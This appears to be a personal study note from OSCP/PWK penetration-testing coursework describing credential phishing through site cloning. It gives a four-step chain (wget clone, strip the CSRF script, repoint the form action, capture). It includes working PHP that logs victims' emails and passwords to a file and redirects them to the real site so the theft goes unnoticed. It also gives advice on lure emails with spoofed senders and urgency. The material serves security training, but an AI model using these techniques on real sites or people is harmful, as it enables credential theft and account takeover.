---
title: "Credential Phishing — Site Clone Methodology"
created: "2026-04-05"
type: permanent-note
status: active
tags:
  - permanent-note
  - phishing
  - credential-harvesting
  - social-engineering
  - oscp
---

# Credential Phishing — Site Clone Methodology

**Core idea:** Credential harvesting via a cloned website is more reliable than exploits because it targets humans, not software. The attacker clones a real login page, fixes CSRF protection that would reject fake submissions, and redirects the form POST to a capture script — all while the victim sees a pixel-perfect copy of the real site.

---

## Why Cloning Works Better Than Writing From Scratch

A hand-crafted fake login page looks wrong — mismatched fonts, broken images, slightly off colors. Modern users are increasingly suspicious of visual mismatches.

`wget -r` downloads **the exact page** with all assets — CSS, fonts, JavaScript, images. The victim sees the real Zoom/Microsoft/Google UI. There's no visual tell.

The only manipulation is:
1. Remove CSRF protection (so our POST is accepted)
2. Change the form `action` URL (so credentials come to us)

---

## The Four-Step Attack Chain

```
1. CLONE    → wget -r -np -k URL → exact copy of login page
2. CLEAN    → remove CSRFGuard script → form submissions no longer rejected
3. INJECT   → change form action to /capture.php → our server receives POST
4. CAPTURE  → PHP logs creds to file → redirect victim to real site
```

---

## The CSRF Problem (and Why It Matters)

Modern login pages include **CSRF tokens** — server-generated values embedded in the form that the server validates on submission. If the token is missing or invalid, the server rejects the POST.

The cloned page has **stale tokens** (or CSRF protection JavaScript that fetches new tokens from the real server — which won't work because we're not the real server).

**The fix:** Remove the CSRF JavaScript entirely. We're not submitting to the real server — we're submitting to *our* PHP capture script, which doesn't validate CSRF at all.

```bash
# Find it
grep -r "CSRFGuard\|csrf" /var/www/html/clone/

# Remove the script tag from HTML
# Before: <script src="csrf_js/signin.html"></script>
# After:  (deleted)
```

---

## The Capture Script Pattern

```php
<?php
file_put_contents('/var/www/html/creds.txt',
    date('Y-m-d H:i:s') . ' | ' . $_POST['email'] . ' | ' . $_POST['password'] . "\n",
    FILE_APPEND
);
header('Location: https://real-site.com/signin');
exit;
?>
```

**The redirect is critical:** Victim thinks they mistyped their password. They land on the real site, log in again successfully, and don't report anything. Meanwhile you have their credentials.

---

## Social Engineering Layer

The technical clone is only half the attack. The victim has to *visit the page.*

The lure email needs:
- Believable sender (spoofed or look-alike domain)
- Urgency or trust trigger ("Your account was accessed from an unfamiliar location")
- Link that looks plausible (use a bit.ly or URL with the target's brand name in it)

**Psychological principle:** Fear + Urgency override careful thinking. The victim clicks before they evaluate.

---

## Connections

- [[PWK-Module-11-Phishing-Basics]] — full module with wget walkthrough and Zoom case study
- [[PWK-Module-12-Client-Side-Attacks]] — Office macros + Windows Library files (deliver payload instead of credential harvest)
- CSRF concepts: removing CSRF protection from cloned sites is the same reason CSRF vulnerabilities exist — servers trust form submissions without verifying origin
- Captured credentials → password spray against AD (covered in Module 16)

---

*From: PWK Module 11, pages 321-342*
